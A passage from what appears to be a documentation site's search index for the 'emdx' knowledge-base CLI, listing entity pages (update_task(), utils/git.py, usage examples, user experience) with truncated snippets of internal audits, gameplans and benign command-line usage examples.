queries</p> </li> <li> <p><code>tasks.py</code>: <code>create_task()</code>, <code>update_task()</code>, SQL queries</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Model Layer (emdx/models/tasks.py)</p> <p>...ask()<code>| Fetch by ID | |</code>list_tasks()<code>| Filter by status, gameplan, project | |</code>update_task()<code>| Update fields, auto-set</code>completed_at<code>| |</code>get_dependencies()<code>| Tasks this depends on | |</code>get_dependents()<code>| Tasks blocked by this | |</code>get_ready_tasks()` | O...</p> </li> </ul>"},{"location":"entities/updatetask/#4-kwargs-for-update-functions-medium-priority","title":"4. <code>**kwargs</code> for Update Functions (Medium Priority)","text":"<p>Functions like <code>update_task()</code>, <code>update_execution()</code>, <code>update_group()</code> use <code>**kwargs: Any</code> but have explicit allowlists.</p>"},{"location":"entities/updatetask/#39-_safe_update_tasktask_id-kwargs-any","title":"39. <code>_safe_update_task(task_id, **kwargs: Any)</code>","text":""},{"location":"entities/updatetask/#7-missing-transaction-commit-in-update_task-success-paths","title":"7. Missing Transaction Commit in <code>update_task()</code> Success Paths","text":"<p>File: <code>emdx/models/tasks.py:165-188</code> Severity: High</p>"},{"location":"entities/updatetask/#related-entities","title":"Related Entities","text":"<ul> <li><code>lastrowid</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>add_dependency()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_update_group_metrics()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>conn.commit()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>get_execution_stats()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>create_task()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>update_execution()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>unpack</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>anthropic.anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>_would_cycle()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/usage-examples/","title":"usage examples","text":"<p>Type: heading | Mentioned in: 19 documents | First seen: 2025-07-07</p>"},{"location":"entities/usage-examples/#documents-19","title":"Documents (19)","text":"<ul> <li>#6556 Delegate: --memory N flag implementation </li> </ul> <p>In <code>tests/test_delegate_commands.py</code>:</p> <ul> <li><code>TestFormatTimeAgo</code> class (4 tests):</li> <li><code>test_minutes_ago</code> / <code>test_hours_ago</code> / <code>test_days_ago</code></li> <li> <p><code>test_invalid_datetime_returns_unknown</code></p> </li> <li> <p><code>TestGetMemoryContext</code> class (6 tests):</p> </li> <li> <p>`...</p> </li> <li> <p>#6478 PROZE: AI-Powered Prose Diff Tool</p> <p>Progressive enhancement: Works offline, gets smarter with AI</p> </li> <li>Beautiful output: diff-so-fancy level polish for prose</li> </ul>"},{"location":"entities/usage-examples/#tests-added","title":"Tests Added","text":""},{"location":"entities/usage-examples/#usage-examples_1","title":"Usage Examples","text":"<pre><code># Basic usage\nproze old.md new.md\n\n# As git diff driver (after setup)\ngit diff README.md\n\n# Wit...\n\n- **#6452** Implement emdx compact command\n  &gt; compact command (emdx/commands/compact.py)\n- **Discovery Mode** (free, no API):\n  - `--dry-run`: Show clusters using TF-IDF similarity\n  - `--threshold`: Adjust similarity threshold (default 0.5)\n  - `--topic`: Filter to documents matching topic\n\n-...\n\n- **#6450** Implement emdx distill command\n  &gt; tests/test_distill.py\n\n**Test Coverage:**\n- SynthesisService: 10 tests covering model init, empty docs, prompts, synthesis\n- DistillCommand: 4 tests covering CLI invocation, error handling\n- SynthesisResult: 1 test for dataclass creation\n\n### 4. emdx...\n\n- **#6448** Implement emdx compact command\n  *Section: Components Created*\n  &gt; ## Usage Examples\n```bash\n# Discovery (free, local)\nemdx compact --dry-run              # Show clusters\nemdx compact --threshold 0.7 -n     # Higher threshold\n\n- **#6446** Implement emdx distill command\n  &gt; **tests/test_distill.py**\n   - 15 unit tests covering:\n     - SynthesisService with mocked API client\n     - Audience enum and prompt differences\n     - Distill command with various options\n     - Error handling for missing dependencies\n\n### Modified...\n\n- **#6412** Delegate: Implement 'emdx review' CLI commands for triaging agent outp\n  *Section: Changes Made*\n  &gt; ## Usage Examples\n```bash\n# List pending reviews\nemdx review list\nemdx review list --json\n\n- **#6409** Delegate: Research and design smarter context injection for emdx deleg [1/2]\n  &gt; existing options ... context: str | None = typer.Option(\n        None, \"--context\", \"-C\",\n        help=\"Search query for auto-selecting relevant documents as context\",\n    ),\n    context_docs: int = typer.Option(\n        5, \"--context-docs\",\n        ...\n\n- **#6365** Gameplan: emdx delegate --draft-pr mode\n  &gt; `--draft` without `--pr` can emit a clear error: \"Error: --draft requires --pr\"\n4. Future-proof if we want `--draft` to mean something else in other contexts\n\n## Usage Examples\n\n```bash\n# Draft PR for single task\nemdx delegate --pr --draft \"fix the a...\n\n- **#6144** Delegate: Read gameplan by running: emdx view 6103. Implement the Ask  [7/7]\n  *Section: Ask the KB Feature Implementation Complete*\n  &gt; ### Usage Examples\n```bash\n# Filter by tags\nemdx ai ask \"What's TODO?\" --tags \"active,gameplan\"\n\n- **#6140** Delegate: Read gameplan by running: emdx view 6101. Implement the Drea [5/7]\n  *Section: Dream Journal Implementation Complete*\n  &gt; ### Usage Examples\n```bash\nemdx dream                    # Run analysis and save digest\nemdx dream --digest           # Preview without saving\nemdx dream --latest           # View last...\n\n- **#452** Minimal Tag Taxonomy - Space-Efficient\n  &gt; # Minimal Tag Taxonomy - Space-Efficient Version\n\nBased on actual usage patterns, here's a streamlined taxonomy focused on what you actually use:\n\n## Core Tags (Single Words Only)\n\n### Document Types\n- `gameplan` - Strategic plans\n- `analysis` - Inve...\n\n- **#451** Tag Taxonomy for EMDX Project Management\n  &gt; # Tag Taxonomy for EMDX Project Management\n\nBased on analysis of current workflow patterns, here's a proposed hierarchical tag taxonomy for sophisticated project management and success tracking:\n\n## Core Workflow Tags\n\n### Document Types\n- `gameplan`...\n\n- **#284** CLAUDE-SYSTEM-ADVANCED-DESIGN\n  &gt; Smart formatting to force vertical display\n3. Context-aware suggestions\n\n## Multi-Level Completion Concept\n\n### Level 1: Prefixes/Namespaces\n```fish\nclaude-view &lt;TAB&gt;\nproject:        View documents by project\ntag:           View documents by tag  \nda...\n\n- **#162** Claude Stored Procedures POC\n  &gt; View Document with Access Tracking\n```sql\nCREATE OR REPLACE FUNCTION claude.view_document(\n    p_identifier TEXT  -- Can be ID or title\n) RETURNS TABLE(\n    id INTEGER,\n    title TEXT,\n    content TEXT,\n    project TEXT,\n    created_at TIMESTAMP,\n   ...\n\n- **#176** Project Overview Documentation\n  &gt; **Smart Completions** - Context-aware tab completion for database operations\n6. **Access Tracking** - Tracks document views and access patterns\n\n## Technology Stack\n\n- **Language**: Fish shell scripting\n- **Database**: PostgreSQL\n- **Integration**: M...\n\n- **#185** MCP-SETUP-GUIDE\n  &gt; OAuth 2.0 credentials (see `gmail-mcp-setup.md` for detailed steps)\n\n### Current Configuration\n```bash\n# Check status\nclaude mcp get gmail-mcp\n\n# Location\n/Users/alexrockwell/mcp-servers/gmail-mcp/\n</code></pre>"},{"location":"entities/usage-examples/#authentication","title":"Authentication","text":"<ul> <li> <p>First use will open browse...</p> </li> <li> <p>#36 Claude Document Template System</p> <p>Automation: Scripts can parse metadata section</p> </li> <li>Consistency: Everyone uses same format</li> </ul>"},{"location":"entities/usage-examples/#usage-examples_2","title":"Usage Examples","text":"<p>```fish</p>"},{"location":"entities/usage-examples/#create-a-new-plan","title":"Create a new plan","text":"<p>claude-new plan \"Improve Search Performance\"</p>"},{"location":"entities/usage-examples/#find-all-high-priority-items","title":"Find all high priority items","text":"<p>claude-find \"#HIGH -#IMPLEME...</p> <ul> <li>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Phase 3: Documentation Cleanup (Next 15 minutes) <p>Solution: Create single authoritative <code>README.md</code> with clear sections:</p> </li> <li>Quick Start</li> <li>Installation</li> <li>Usage Examples</li> <li>Development Setup</li> </ul>"},{"location":"entities/usage-examples/#related-entities","title":"Related Entities","text":"<ul> <li><code>urgent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>this approach</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>success tracking</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>postgresql mcp pro</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>implementation: emdx distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>gmail mcp</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>gameplan lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>estimate_cost(doc_ids)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>document types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> <li><code>components created</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/user-experience/","title":"user experience","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/user-experience/#documents-9","title":"Documents (9)","text":"<ul> <li>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A) <p>The knowledge base becomes a queryable oracle. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#basic-qa","title":"Basic Q&amp;A:","text":"<p>```bash emdx ai ask \"What's our tech stack for the prose diff tool?\"</p>"},{"location":"entities/user-experience/#based-on-6086-6089-6091","title":"Based on #6086, #6089, #6091:","text":""},{"location":"entities/user-experience/#_1","title":"user experience","text":""},{"location":"entities/user-experience/#the-prose-diff-tool-proze-uses","title":"The prose diff tool (proze) uses:","text":""},{"location":"entities/user-experience/#-python-312-with-markdown","title":"- Python 3.12 with markdown...","text":"<ul> <li>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing <p>Borrows from spaced repetition: the KB actively reminds you what you're forgetting, prioritized by importance. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#check-stale-docs","title":"Check stale docs:","text":"<p>```bash emdx stale</p>"},{"location":"entities/user-experience/#docs-needing-review","title":"Docs needing review:","text":""},{"location":"entities/user-experience/#_2","title":"user experience","text":""},{"location":"entities/user-experience/#critical-high-importance-long-stale","title":"CRITICAL (high importance, long stale):","text":""},{"location":"entities/user-experience/#6023","title":"#6023 \"...","text":"<ul> <li>#6101 Gameplan #5: Dream Journal (Overnight Consolidation) <p>Like a brain processing the day's experiences during sleep \u2014 merging fragments, identifying patterns, flagging contradictions, pruning noise. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#manual-trigger","title":"Manual trigger:","text":"<p>```bash emdx dream</p>"},{"location":"entities/user-experience/#dream-journal-processing-47-docs","title":"\ud83c\udf19 Dream Journal \u2014 Processing 47 docs...","text":""},{"location":"entities/user-experience/#con","title":"Con...","text":"<ul> <li>#6100 Gameplan #4: Semantic Find Upgrade <p>Plus: chunk-level indexing so long docs return just the relevant paragraph, not 5000 words. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#hybrid-search-unified-command","title":"Hybrid search (unified command):","text":"<p>```bash emdx find \"authentication patterns\"</p>"},{"location":"entities/user-experience/#keyword-matches","title":"Keyword matches:","text":""},{"location":"entities/user-experience/#6045-api-security-notes-3-key","title":"#6045 \"API Security Notes\" \u2014 3 key...","text":"<ul> <li>#6099 Gameplan #3: Smart Priming <p>Instead of generic project docs, Claude gets a curated context package: recent work, key decisions, knowledge gaps, and stale docs that need attention. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#current-dumb-prime","title":"Current (dumb prime):","text":"<p>```bash emdx prime</p>"},{"location":"entities/user-experience/#returns-recent-docs-for-detect","title":"Returns: recent docs for detect...","text":"<ul> <li>#6098 Gameplan #2: Auto-Linking on Save <p>The KB becomes a self-organizing knowledge graph \u2014 not just a pile of docs. ## User Experience</p> </li> </ul>"},{"location":"entities/user-experience/#on-save","title":"On save:","text":"<p>```bash echo \"research on auth patterns\" | emdx save --title \"Auth Patterns\"</p>"},{"location":"entities/user-experience/#saved-6100-auth-patterns","title":"\u2713 Saved #6100 \"Auth Patterns\"","text":""},{"location":"entities/user-experience/#linked-to","title":"\ud83d\udd17 Linked to:","text":""},{"location":"entities/user-experience/#6045-api-se","title":"#6045 \"API Se...","text":"<ul> <li>#6528 Delegate: Review GitHub PR #650 using 'gh pr view 650' and 'gh pr diff [3/4]   Section: Strengths <ol> <li>User Experience:</li> </ol> </li> <li>Streaming answers with progressive status updates</li> <li>Clear source citations with doc IDs</li> <li>Save Q&amp;A exchanges to knowledge base (s key)</li> <li> <p>Welcome message with examples</p> </li> <li> <p>#445 Piped content - 2025-07-12 01:58   Section: 4. Benefits</p> <ol> <li>User Experience: Immediate command reference without memorization</li> </ol> </li> <li>Consistency: Matches expectations from previous FZF interface</li> <li> <p>Context Awareness: Different help bas...</p> </li> <li> <p>#248 Clauding Additional Concerns - Architectural and Operational Debt   Section: \ud83c\udfaf What's Missing from a \"Real\" System**</p> </li> <li>No interactive mode</li> <li>No undo functionality</li> <li>No bulk operations UI</li> <li>No progress indicators</li> <li>Cryptic error messages</li> </ul>"},{"location":"entities/user-experience/#3-user-experience","title":"3. User Experience","text":""},{"location":"entities/user-experience/#related-entities","title":"Related Entities","text":"<ul> <li><code>security notes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synergies</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>feature #5 (dream journal)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>feature #3 (smart priming)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>technical requirements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.3)</li> <li><code>effort estimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.3)</li> <li><code>vision</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.1)</li> <li><code>risks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.0)</li> <li><code>session management</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>prototype results</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/utils/","title":"utils/","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/utils/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Overview</p> <p>Three parallel audits covered the entire <code>emdx/</code> codebase \u2014 <code>services/</code> (+ <code>cli_executor/</code>), <code>config/</code>, <code>models/</code>, and <code>utils/</code>. The combined results reveal significant dead code accumulation across the project.</p> </li> <li> <p>#6614 Delegate: Update documentation to remove all references to emoji alias   Section: Changes Made</p> </li> <li>Changed <code>utils/</code> description from \"emoji aliases\" to \"tags\"</li> <li> <p>Changed \"Documents use tags (emoji aliases)\" to \"Documents use plain text tags\"</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: By layer:</p> <p>...| 4 | ~15 | 27% | | <code>database/</code> | 4 | ~10 | 40% | | <code>models/</code> | 2 | ~8 | 25% | | <code>utils/</code> | 5 | ~10 | 50% | | <code>config/</code> | 2 | ~5 | 40% |</p> </li> <li> <p>#6336 Move execution utilities to services layer   Section: Move Execution Utilities to Services Layer</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Medium-Term Refactors</p> <ol> <li>Split <code>migrations.py</code> into directory with 1 file per migration</li> </ol> </li> <li>Merge <code>git.py</code> + <code>git_ops.py</code> (duplicate <code>create_worktree()</code>)</li> <li>Move execution code from <code>utils/</code> to <code>services/execution/</code></li> <li> <p>Add presenters to LogBrowser and CascadeBrowser</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Dependency Flow Analysis</p> </li> <li><code>commands/</code> \u2192 <code>services/</code> \u2192 <code>database/</code></li> <li><code>ui/</code> \u2192 <code>models/</code> (for data access)</li> <li> <p><code>utils/</code> has no internal dependencies</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: Architecture Quality</p> <p>...ules \u2014 Business logic \u251c\u2500\u2500 ui/            # 32 modules \u2014 Textual TUI components \u251c\u2500\u2500 utils/         # 14 modules \u2014 Shared utilities \u2514\u2500\u2500 config/        # 4 modules \u2014 Settings and configuration ```</p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: Module-by-Module Analysis</p> <p>...ng | | <code>services/</code> | 7/10 | Good fallback patterns, some overly broad catches | | <code>utils/</code> | 7/10 | Consistent patterns, some silent catches need logging | | <code>models/</code> | 8/10 | Proper sqlite3 exception handling | | <code>database/</code> | 8/10 | Good integrity erro...</p> </li> </ul>"},{"location":"entities/utils/#claudemd","title":"CLAUDE.md","text":""},{"location":"entities/utils/#summary","title":"Summary","text":"<p>Moved execution-specific code from <code>utils/</code> to <code>services/</code> where it logically belongs:</p>"},{"location":"entities/utils/#clean-dependencies","title":"Clean Dependencies \u2713","text":""},{"location":"entities/utils/#related-entities","title":"Related Entities","text":"<ul> <li><code>total python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>type safety coverage audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>toolcallmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tool_uses</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>thinkingmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>tasks_completed: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>systemmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/utilsgitpy/","title":"utils/git.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/utilsgitpy/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> <li>Superseded implementations \u2014 <code>utils/git_ops.py</code> (~700 lines) was replaced by <code>utils/git.py</code> but never deleted. Similarly <code>config/ui_config.py</code> has functions superseded by <code>ui/themes.py</code>.</li> </ol> </li> <li> <p>#6871 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/utilsgitpy/#synthes-24","title":"Synthes [2/4]","text":"<p>...ils/git_ops.py<code>is ~700 lines of almost entirely dead code \u2014 it was superseded by</code>utils/git.py` which provides the functions the codebase actually uses. Three entire files can be deleted, and 10 individual functions across 5 other files are dead....</p> <ul> <li>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Architecture Notes <p>...ch_name<code>,</code>validate_pr_preconditions<code>,</code>create_worktree<code>,</code>cleanup_worktree<code>from</code>utils/git.py`</p> </li> <li>Document ops: <code>get_document</code>, <code>save_document</code> from <code>database/documents.py</code></li> <li> <p>Task model: <code>create_task</code>, <code>update_task</code> from <code>models/tasks.py</code>...</p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: What Works Well</p> <ol> <li>Worktree Isolation (<code>utils/git.py</code>)</li> </ol> </li> <li>Automatic worktree creation for parallel git work</li> <li>Clean branch naming with collision-resistant hashes</li> <li> <p>Proper cleanup on completion (except <code>--branch</code> mode)</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: \ud83d\udd34 HIGH PRIORITY: Git Context</p> <p>Current State:</p> </li> <li><code>prime.py</code> does NOT call any git commands except <code>get_git_project()</code> (project name only)</li> <li> <p>The git utilities exist (<code>utils/git.py</code>) but aren't used for context enrichment</p> </li> <li> <p>#6445 Test [2/2]   Section: Coverage Analysis by Area</p> <p>...--|----------|-------| | <code>utils/lazy_group.py</code> | 69% | Lazy CLI group loading | | <code>utils/git.py</code> | 68% | Git utilities | | <code>services/file_watcher.py</code> | 66% | File watching | | <code>ui/formatting.py</code> | 64% | UI formatting | | <code>ui/log_browser_filtering.py</code> | 61% | Lo...</p> </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: 1. Consolidate Git Utilities (HIGH IMPACT)</p> <p>Problem: Git functionality split across 3 files with duplication</p> </li> <li><code>utils/git.py</code> (129 lines) - basic git ops</li> <li><code>utils/git_ops.py</code> (753 lines) - TUI git ops + duplicate worktree code</li> <li> <p><code>services/</code> has no git service</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: 1. Module Duplication Pattern (High Impact)</p> File Purpose Functions <code>utils/git.py</code> Basic git operations <code>create_worktree()</code>, <code>cleanup_worktree()</code>, <code>get_git_project()</code> <code>utils/git_ops.py</code> Extended git operations <code>create_worktree()</code>, `get... </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Changes Made</p> </li> <li><code>DEFAULT_GIT_BRANCH = \"main\"</code> constant</li> <li><code>EMDX_DEFAULT_BRANCH</code> environment variable support</li> <li> <p><code>get_default_branch()</code> helper in <code>utils/git.py</code></p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...nment.py<code>| \ud83d\udfe1 HIGH | 4 functions | Test subprocess env setup, PATH validation | |</code>utils/git.py<code>| \ud83d\udfe1 HIGH | 3 functions | Test worktree create/cleanup, project detection | |</code>utils/logging_utils.py<code>| \ud83d\udfe1 HIGH | 2 functions | Test logger setup | |</code>utils/output.p...</p> </li> </ul>"},{"location":"entities/utilsgitpy/#3-added-git-default-branch-support","title":"3. Added Git Default Branch Support","text":""},{"location":"entities/utilsgitpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>utils/logging_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>utils/environment.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ui/formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>test_output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>test_groups.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>test_commands_cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>utils/text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>utils/git_ops.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.9)</li> <li><code>utils/output_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>utils/emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/validatediscoverycommand/","title":"_validate_discovery_command()","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/validatediscoverycommand/#documents-12","title":"Documents (12)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made 